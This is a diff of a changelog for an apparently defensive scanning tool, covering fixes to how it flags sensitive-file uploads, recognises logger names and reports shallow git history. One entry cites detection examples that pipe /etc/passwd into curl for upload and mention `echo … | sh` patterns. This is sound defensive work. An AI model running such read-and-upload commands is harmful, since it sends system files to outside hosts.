@@ -264,7 +264,7 @@ cached quality snapshot is recomputed. The session legend dictionary is `dictv=0
 
 ### Fixed — `--scan-skill(s)`: quoting a sensitive path no longer hides its upload (sensitive-read-upload)
 
-`cat /etc/passwd | curl --data-binary @- URL` grades CRITICAL, but `cat "/etc/passwd" | curl …` scanned clean: an
+`cat /etc/passwd | curl … @- URL` grades CRITICAL, but `cat "/etc/passwd" | curl …` scanned clean: an
 opening quote put the flow scan back in command position, so the reader's quoted file was read as a command and its
 read was never noted. A quote no longer re-arms command position inside a reader's segment (it still does elsewhere,
 so `sh -c "…"` and `echo "…" | sh` are read as code), and a shell word split by quotes or escapes (`/etc/"passwd"`,
@@ -278,6 +278,16 @@ When no workspace root had a commit to mine, the refusal probed only the primary
 primary next to a depth-limited secondary still said "git unavailable / no history". The refusal now probes every
 mined root (the one root `--owners=SYM` mines) and names the shallow root it found, as the success paths' `shallow="1"`
 already did. Single-root output is unchanged. Gate: `test/shallowhistorycheck.sh` section 3m.
+
+### Fixed — `--quality-delta` error-masking: log-only recognises loggers spelled with a call, a sigil, an acronym or a digit
+
+The whole-word logger rule split a receiver only on `_`, `-` and camelCase, so `logging.getLogger(__name__).error(…)`,
+`get_logger()`, `structlog.get_logger()`, `@logger`, `$logger`, `this.#logger`, `HTTPLogger`, `logger2`, `mylog` and
+`vlog` were no longer loggers, and Python's gating log-only rows were lost. Trailing call arguments now come off before
+the last `.` segment, words split on every non-alphanumeric byte, at acronym-to-word and at letter-to-digit steps, and a
+logger package spelled as one word (structlog, logfire, logbook, loguru) or log/logger/logging behind a one- or
+two-letter prefix counts. English words that end in "log" (catalog, dialog, backlog, analog, changelog, blog) and
+technology still log nothing. Still a miss: a logger behind a longer one-word prefix (`auditlog`).
 
 ### Fixed — review round on train 22: false gates, a stack overflow, silent cuts
 
